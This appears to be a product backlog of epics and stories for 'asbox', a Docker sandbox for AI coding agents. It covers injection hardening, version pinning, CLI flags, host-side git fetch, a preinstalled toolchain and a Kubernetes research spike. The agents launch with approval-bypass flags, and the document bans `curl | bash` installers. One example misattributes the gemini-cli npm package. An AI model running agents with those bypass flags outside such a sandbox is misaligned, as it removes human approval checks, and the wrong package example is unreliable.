- Add `validateEnvKey()` in `internal/config/parse.go` — regex: `^[a-zA-Z_][a-zA-Z0-9_]*$`
- Add `validateEnvValue()` — reject strings containing `\n`, `\r`, or `\0`
- Ensure the Dockerfile template quotes ENV values: `ENV {{$k}}="{{$v}}"` (already done in story 1-3)
- Validate in `Parse()` loop over `cfg.Env` map

### Story 11.4: Non-TTY Runtime Support

As a developer,
I want asbox to detect whether it's running in a terminal or in a CI/CD pipeline,
So that sandbox sessions work correctly in both interactive and non-interactive contexts.

**Acceptance Criteria:**

**Given** a developer runs `asbox run` in an interactive terminal
**When** the container is started
**Then** Docker is invoked with `-it` flags (interactive + TTY allocated) and the agent session is fully interactive

**Given** a developer runs `asbox run` in a non-TTY context (e.g., CI/CD pipeline, piped input)
**When** the container is started
**Then** Docker is invoked with `-i` only (interactive, no TTY) — no "the input device is not a TTY" error

**Given** a developer pipes input to `asbox run` (e.g., `echo "test" | asbox run`)
**When** the container is started
**Then** the piped input is forwarded to the container's stdin without TTY allocation errors

**Given** the TTY detection logic
**When** inspected
**Then** it uses `term.IsTerminal(os.Stdin.Fd())` or equivalent to detect terminal presence — not environment variable heuristics

**Implementation Notes:**
- Add `golang.org/x/term` dependency (or use `golang.org/x/sys/unix` — `unix.IoctlGetTermios`)
- Modify `internal/docker/run.go` `RunContainer()` to conditionally include `-t` flag based on TTY detection
- Always include `-i` (interactive) — only `-t` (TTY) is conditional
- Update existing tests that assert `-it` to handle both cases

### Story 11.5: Pinned Build Dependencies

As a developer,
I want Dockerfile dependencies to be version-pinned for reproducible builds,
So that sandbox images built today produce the same result as images built next month.

**Acceptance Criteria:**

**Given** the Dockerfile template installs Docker Compose
**When** the image is built
**Then** Docker Compose is installed at a specific pinned version (e.g., `v2.32.4`) fetched from a versioned GitHub release URL — not from the GitHub API `latest` endpoint

**Given** the Dockerfile template installs `gemini-cli` via npm
**When** the image is built
**Then** `gemini-cli` is installed at a specific pinned version (e.g., `npm install -g @anthropic-ai/gemini-cli@1.2.3`)

**Given** the Dockerfile template installs `@openai/codex` via npm
**When** the image is built
**Then** `@openai/codex` is installed at a specific pinned version

**Given** the Dockerfile template specifies the base image
**When** the image is built
**Then** the base image uses a multi-arch manifest digest (e.g., `ubuntu:24.04@sha256:<multi-arch-digest>`) that works on both amd64 and arm64

**Given** a developer or maintainer needs to bump pinned versions
**When** they look for guidance
**Then** a comment block in `embed/Dockerfile.tmpl` documents the version update process: which URLs to check, how to obtain multi-arch digests, and how to verify the update

**Implementation Notes:**
- Pin Docker Compose: change from GitHub API latest to explicit version URL
- Pin npm packages: add `@version` suffix to all `npm install -g` commands
- Base image digest: use `docker manifest inspect ubuntu:24.04` to get multi-arch digest; test on both amd64 and arm64
- Add comment block at top of `embed/Dockerfile.tmpl` documenting the pinning and update process
- Content hash will change when versions are bumped — this is correct behavior

### Story 11.6: Agent Command Injection Hardening

As a developer,
I want agent launch commands to be executed safely without shell expansion risks,
So that agent command strings cannot be exploited through shell injection.

**Acceptance Criteria:**

**Given** an agent is launched inside the sandbox
**When** the entrypoint executes the agent command
**Then** the command is executed via `exec gosu sandbox` with explicit arguments — not via `bash -c "${AGENT_CMD}"`

**Given** the agent command for claude is `claude --dangerously-skip-permissions`
**When** the entrypoint launches the agent
**Then** the command is split into an argument array `["claude", "--dangerously-skip-permissions"]` and executed directly — no shell interpolation occurs

**Given** the agent command for gemini is `gemini -y`
**When** the entrypoint launches the agent
**Then** it is executed as `exec gosu sandbox gemini -y` — direct exec, no `bash -c` wrapper

**Given** the agent command for codex is `codex --dangerously-bypass-approvals-and-sandbox`
**When** the entrypoint launches the agent
**Then** it is executed as a direct exec with explicit arguments

**Given** the `AGENT_CMD` environment variable is set by the Go CLI
**When** the entrypoint reads it
**Then** the variable format supports safe argument splitting (e.g., space-separated tokens where each token is a single argument) and the entrypoint does not pass the value through `bash -c`

**Implementation Notes:**
- Modify `embed/entrypoint.sh` to replace `exec gosu sandbox bash -c "${AGENT_CMD}"` with direct exec
- Option A: Split `AGENT_CMD` on spaces and exec directly: `exec gosu sandbox ${AGENT_CMD}` (word splitting without `bash -c`)
- Option B: Pass separate env vars `AGENT_BIN` and `AGENT_ARGS` for explicit control
- Option A is simpler and sufficient since agent commands are controlled by the Go CLI, not user input
- Update all agent command strings in `cmd/run.go` to ensure they are safe for word-splitting

## Epic 12: CLI Ergonomics for Agent Override

Reduce friction on the most common runtime choice — "which agent do I want to launch right now?" — by adding a short flag alias (`-a`) and a positional argument to `asbox run`. Both forms coexist with the existing `--agent` flag; specifying more than one form produces a usage error so resolution is never ambiguous.

### Story 12.1: Short `-a` Flag and Positional Agent Argument for `asbox run`

As a developer,
I want to switch agents quickly with either `asbox run -a codex` or `asbox run codex`,
So that I don't have to type `--agent` every time I want to try a different agent.

**Acceptance Criteria:**

**Given** the developer runs `asbox run -a codex`
**When** the CLI parses flags
**Then** `codex` is used as the agent override (must be in `installed_agents`), with identical validation and behavior to `--agent codex`

**Given** the developer runs `asbox run codex` (positional argument, no flag)
**When** the CLI parses arguments
**Then** `codex` is used as the agent override, with identical validation and behavior to `--agent codex`

**Given** the developer runs `asbox run codex --agent claude` or `asbox run -a claude codex`
**When** the CLI parses arguments
**Then** the CLI exits with code 2 and prints `error: agent specified both as positional argument ('codex') and via --agent ('claude') — use only one form` — and no container is started

**Given** the developer runs `asbox run notanagent` (positional value not in `installed_agents`)
**When** the CLI parses arguments
**Then** the CLI exits with code 1 via the existing `ValidateAgentInstalled` error path, naming the unknown agent and listing the installed agents

**Given** the developer runs `asbox run` with neither positional nor flag
**When** the CLI resolves the agent
**Then** `config.DefaultAgent` is used as before — no behavior change for the default case

**Given** the developer runs `asbox run --help`
**When** the help text is rendered
**Then** both the short flag (`-a, --agent`) and the positional `[agent]` appear in the usage line with a one-line description of each

**Implementation Notes:**
- Add `Shorthand: "a"` to the existing `--agent` flag definition in `cmd/run.go`.
- Set `Args: cobra.MaximumNArgs(1)` on the `runCmd` definition.
- In `runCmd.RunE`: detect "flag explicitly set" via `cmd.Flags().Changed("agent")` (not by value comparison — user could have passed `-a claude` while `default_agent` is already `claude`). If both `len(args) == 1` and `Changed("agent")` are true, return a new `UsageError` type.
- Add `UsageError` to `cmd/errors.go` and map it to exit code 2 in `cmd/root.go`'s `exitCode()` function, alongside the existing entries. Add to `cmd/root_test.go` table.
- Resolution precedence inside `runCmd.RunE`: (1) both set → `UsageError`; (2) positional set → use it; (3) flag set → use it; (4) neither → fall through to `config.DefaultAgent`.
- Pass the resolved agent name through the existing `ValidateAgentInstalled` call — no duplication of validation logic.
- Update the Cobra `Use:` string on `runCmd` from `"run"` to `"run [agent]"` so the help text surfaces the positional.
- Tests: table-driven test in `cmd/run_test.go` covering all six acceptance criteria cases. Integration test (binary invocation) verifying `-a` short flag resolves through a real `asbox run` invocation.

## Epic 13: Multi-Repo State Management

Developers running `asbox` with `bmad_repos` across multiple repositories today have two friction points: (1) the agent has to improvise branch-management conventions each session (feature branch? stash? pick up from last branch?), which produces inconsistent behavior; and (2) the sandboxed agent has no access to host SSH keys or git credential helpers, so it cannot `git fetch` private remotes — the developer has to remember to fetch each repo on the host before starting. This epic addresses both by baking branch conventions into the generated agent instructions and by adding a `--fetch` flag that runs host-side `git fetch --all` across every mounted repository before the sandbox starts.

### Story 13.1: Branch-Management Guidance in Generated Agent Instructions

As a developer using `bmad_repos`,
I want the generated agent instructions to include an opinionated branch-management convention,
So that every agent session manages cross-repo branch state the same way without me having to repeat instructions each run.

**Acceptance Criteria:**

**Given** a developer configures `bmad_repos` with two or more repositories
**When** `asbox run` generates the agent instruction file (`CLAUDE.md` / `GEMINI.md` / `CODEX.md`)
**Then** the rendered file includes a dedicated "Branch Management" section covering three topics in this order: (1) how to create a per-task feature branch in each affected repo before making changes, (2) how to stash or otherwise park in-flight work to keep working trees clean between tasks within a session, (3) how to resume work after a sandbox restart (check the current branch, inspect stash list)

**Given** the branch-management section exists in the template
**When** inspected
**Then** the guidance is a single convention (one feature-branch naming pattern, one stash convention), not a menu of options — the agent should not choose between alternatives

**Given** the generated instruction file
**When** `bmad_repos` is empty or unset
**Then** the branch-management section is omitted (it only applies when there are multiple repos to coordinate)

**Given** the branch naming convention
**When** documented
**Then** it uses a template placeholder (e.g., `asbox/<short-task-slug>`) and the instruction tells the agent to substitute a short slug derived from the task at hand

**Given** the instruction file is regenerated on every `asbox run`
**When** the repo list or project name changes
**Then** the branch-management section remains consistent — no drift from prior sessions

**Implementation Notes:**
- Extend `embed/agent-instructions.md.tmpl` with a `{{if .HasBmadRepos}} ... {{end}}` block containing the Branch Management section.
- The guidance should call out the three topics explicitly (feature branch, stash, resume) with concrete shell snippets.
- No Go code changes needed — purely a template edit — but the existing template test (`internal/mount/bmad_repos_test.go`) should be extended with a case asserting the Branch Management section is present when `bmad_repos` is non-empty and absent otherwise.

### Story 13.2: `--fetch` Flag for Host-Side Upstream Sync

As a developer,
I want `asbox run --fetch` to fetch upstream state for every repository I'm about to mount,
So that the sandboxed agent has current remote refs on all branches — including branches it isn't checked out on — without needing host credential access.

**Acceptance Criteria:**

**Given** the developer runs `asbox run --fetch` with `bmad_repos` listing three repositories
**When** the CLI begins launch orchestration
**Then** before `docker run` is invoked, the CLI runs `git fetch --all` on each of the three `bmad_repos` paths using the developer's host credentials, and on the primary mount if it is a git repository

**Given** `--fetch` is set and one of the repositories is not a git repository (no `.git` entry)
**When** the fetch phase runs
**Then** that path is skipped silently — no error, no warning

**Given** `--fetch` is set and one of the repositories fails to fetch (network error, auth failure)
**When** the fetch phase runs
**Then** the error is logged as a warning naming the failed repo and the git stderr, and the launch continues — other repos still get fetched and the sandbox still starts

**Given** `--fetch` is set with multiple repositories
**When** the fetch phase runs
**Then** fetches run concurrently with a bounded worker pool (default 4) and total wall time is close to the longest single fetch, not the sum

**Given** `--fetch` is NOT passed
**When** the CLI begins launch orchestration
**Then** no fetch runs — the sandbox starts immediately, preserving offline-use behavior

**Given** the `--help` output for `asbox run`
**When** rendered
**Then** the `--fetch` flag appears with a one-line description stating what it does and that failures are non-fatal

**Given** the fetch phase runs
**When** completed
**Then** a single summary line is printed to stdout: `fetched N repositories (M failed, warnings above)` — even if M is 0, the summary line prints for visibility

**Implementation Notes:**
- New package `internal/gitfetch/` with `FetchAll(ctx context.Context, paths []string) []FetchResult`. `FetchResult` contains `Path`, `Err`, `Stderr`.
- Concurrency: bounded worker pool via `golang.org/x/sync/errgroup` with `SetLimit(4)`.
- Git repo detection: a path is a git repo if `filepath.Join(path, ".git")` exists (file or directory — worktrees use a `.git` file pointing at the git dir).
- Invoke `git fetch --all` via `os/exec` with `Dir` set to the repo path; capture combined stderr for the warning message.
- Flag registration in `cmd/run.go`; resolution order: build-if-needed → mount assembly → **fetch if --fetch** → secret validation → `docker run`.
- Tests: unit tests in `internal/gitfetch/` using `t.TempDir()` to create git repos on the fly (testable without a remote via `git init --bare` and local remote configuration). Integration test with a bmad_repos fixture verifying the sandbox sees the freshly fetched refs.

## Epic 14: Pre-Installed Validation & Exploration Toolchain

Agents spending turns on `apt-get install kubectl` or discovering that `fd` isn't installed are agents losing time to infrastructure instead of solving the problem. This epic ships a curated, version-pinned set of DevOps validation tools and code exploration tools in the base sandbox image. All tools run without credentials (they're used for local validation, not remote orchestration) and their caches/data directories are pre-owned by the sandbox user.

### Story 14.1: Pre-Installed DevOps Validation Toolchain

As a developer,
I want `kubectl`, `helm`, `kustomize`, `yq`, `jq`, `opentofu`, `tflint`, `kubeconform`, `kube-linter`, `trivy`, `flux`, and `sops` pre-installed in the sandbox image at pinned versions,
So that the agent can validate Kubernetes and Terraform work without spending turns on tool installation.

**Acceptance Criteria:**

**Given** a newly built sandbox image
**When** the agent invokes any of the listed tools with `--version` or `version`
**Then** each tool responds successfully and reports the pinned version

**Given** the agent runs `trivy image <some-image>` for the first time inside the sandbox
**When** trivy tries to download its vulnerability database to the default cache location
**Then** the download succeeds — the cache directory (`~/.cache/trivy` or equivalent) is pre-created and owned by the sandbox user

**Given** the agent runs `helm install --dry-run` or `kustomize build`
**When** the render is produced
**Then** the operation completes locally without requiring cluster credentials

**Given** the `embed/Dockerfile.tmpl` file
**When** inspected
**Then** each of the twelve tools is installed at an explicit pinned version (no `latest`, no `@latest`, no GitHub API `latest` endpoint) declared in a single place

**Given** the Dockerfile template
**When** inspected
**Then** a comment block at the top of the toolchain section documents each pinned version, the upstream release page used to discover it, and the update procedure (including how to obtain multi-arch digests where applicable)

**Given** the sandbox image is built on both amd64 and arm64 hosts
**When** the toolchain installation runs
**Then** each tool's binary is downloaded for the correct architecture (via `$(dpkg --print-architecture)` or `$(uname -m)` detection, matching each project's release naming convention)

**Given** a content hash is computed for the image
**When** a pinned version is bumped in `embed/Dockerfile.tmpl`
**Then** the content hash changes and the next `asbox build` / `asbox run` triggers a full rebuild — matching the existing reproducibility contract (NFR12, NFR16)

**Given** the integration test suite
**When** a new "toolchain smoke test" is added under `integration/toolchain_test.go`
**Then** it asserts each of the twelve tools runs `--version` successfully inside a freshly launched sandbox

**Implementation Notes:**
- Add a new RUN block at the top of `embed/Dockerfile.tmpl`, after the base image and common apt tooling, named (via comment) `validation_tools`.
- Prefer apt for jq, yq (from `mikefarah/yq` if Ubuntu package is outdated — pin the binary download instead).
- Use versioned GitHub-release tarballs for: kubectl, helm, kustomize, opentofu, tflint, kubeconform, kube-linter, trivy, flux, sops, yq. Download to `/tmp`, extract, move binary to `/usr/local/bin`, `chmod +x`, clean up.
- Multi-arch: use `$(dpkg --print-architecture)` for tools that publish `amd64`/`arm64` releases, `$(uname -m)` for those publishing `x86_64`/`aarch64`. A comment next to each download line documents which naming scheme is used.
- Pre-create cache/data directories: `~/.cache/trivy`, `~/.cache/helm`, `~/.kube`, `~/.terraform.d`, `~/.config/sops`. Chown to `sandbox:sandbox` in the Dockerfile (happens before user switch).
- No `curl | bash` installers for any tool in this story.
- Extend the Dockerfile template comment header to include the version update procedure.
- Update `embed/agent-instructions.md.tmpl` with a brief "Installed Tooling" section listing what's available so the agent doesn't re-discover.

### Story 14.2: Pre-Installed Code Exploration Tools

As a developer,
I want `ripgrep`, `fd`, `ast-grep`, and `universal-ctags` pre-installed in the sandbox image at pinned versions,
So that the agent can navigate and search repositories efficiently without falling back to `find` or building its own symbol maps.

**Acceptance Criteria:**

**Given** a newly built sandbox image
**When** the agent invokes `rg --version`, `fd --version`, `ast-grep --version`, or `ctags --version`
**Then** each tool responds successfully and reports the pinned version

**Given** the agent runs `rg <pattern>` inside a mounted project
**When** the search runs
**Then** `.gitignore` is respected by default and the pattern matches across the repo

**Given** the agent runs `fd <pattern>` inside a mounted project
**When** the search runs
**Then** files matching the pattern are returned, honoring `.gitignore`

**Given** the agent runs `ast-grep run -p '<pattern>' --lang <lang>` inside a mounted project
**When** the search runs
**Then** structural matches are returned (this replaces plain-text grep when the agent needs semantic matches)

**Given** the `embed/Dockerfile.tmpl` file
**When** inspected
**Then** each of the four tools is installed at an explicit pinned version in the same comment-documented block as the DevOps tools (single source of truth for pinned versions)

**Given** the integration test suite
**When** the toolchain smoke test runs
**Then** each of the four exploration tools is covered alongside the DevOps tools

**Implementation Notes:**
- Add exploration tools to the same RUN block as DevOps tools (or an adjacent block labelled `exploration_tools` in a comment — decide based on which keeps the Dockerfile readable).
- ripgrep, fd-find, universal-ctags: apt packages on Ubuntu 24.04 are at acceptable versions — apt install with explicit version pins if possible.
- ast-grep: versioned GitHub-release binary download — apt does not ship it.
- Document each version in the same comment header as story 14.1.
- Git's `git ls-files` is already present via the existing git install (FR23) — explicitly call this out in the `embed/agent-instructions.md.tmpl` "Installed Tooling" section so the agent prefers it for clean repo traversal.

## Epic 15 (Research/POC): Local Kubernetes Cluster Integration

Agents building for EKS and OpenShift today validate Kubernetes work through `helm --dry-run` and `kustomize build`, but those renders don't catch CRD round-trip issues or API-server validation errors. A disposable local Kubernetes cluster reachable from the sandboxed agent would close that gap — but it touches the isolation model (kubeconfig grants cluster-admin, the cluster is a new attack surface). This is a research epic: produce a spike, a prototype, and a security analysis before committing to any productionization path.

### Story 15.1: Kubernetes Integration Research Spike

As a maintainer,
I want a structured spike that evaluates three Kubernetes integration tracks and produces a recommendation,
So that I can decide whether (and how) to productionize local cluster access without committing to a path blindly.

**Acceptance Criteria:**

**Given** the spike is kicked off
**When** research is conducted
**Then** each of three tracks is evaluated: (a) `kind` cluster inside the sandbox via inner Podman, (b) `kind`/`k3s` cluster provisioned on the host with kubeconfig injected into the sandbox via an opt-in mount, (c) at least one alternative surfaced during research (e.g., `vcluster`, shared remote cluster with per-user namespace)

**Given** each track is evaluated
**When** the findings are written up
**Then** the write-up for each track includes: startup time estimate, isolation boundary analysis (what does the agent now have access to that it didn't before), failure modes, disposal/cleanup story, and compatibility with the existing `auto_isolate_deps` and `bmad_repos` features

**Given** Track B (host-side cluster with kubeconfig injection) is evaluated
**When** the security analysis is written
**Then** it explicitly addresses: the trust grant implied by injecting a kubeconfig with cluster-admin into the sandbox, how an agent deliberately or accidentally misbehaving could affect host resources, and what mitigations (scoped kubeconfig, per-session cluster, etc.) make Track B acceptable

**Given** the spike produces a recommendation
**When** presented
**Then** the recommendation identifies: the preferred track with rationale, the minimum changes needed to implement it (config surface, new flags, Dockerfile additions), and explicit next-step stories

**Given** the spike includes a prototype
**When** delivered
**Then** at least one track has a working prototype (a feature branch or draft PR) demonstrating the agent can render and apply a manifest against a cluster and observe the resulting state — enough to confirm feasibility, not production-ready

**Given** the spike is complete
**When** the user reviews the output
**Then** productionization is an explicit decision gate — no additional work is done on Kubernetes integration without sign-off on the recommended track

**Implementation Notes:**
- Output artifact: `_bmad-output/planning-artifacts/k8s-integration-spike-<date>.md` with sections: Context, Evaluation Methodology, Track A Analysis, Track B Analysis, Track C Analysis, Security Analysis (Track B focus), Recommendation, Next Steps.
- Prototype artifact: a branch (not merged) that demonstrates the recommended track working end-to-end with a sample manifest.
- This story is intentionally open-ended — do not pre-commit to implementation details. The goal is decision-quality information, not implementation.
- Follow-up stories (15.2+) will be defined after the spike based on the recommendation.
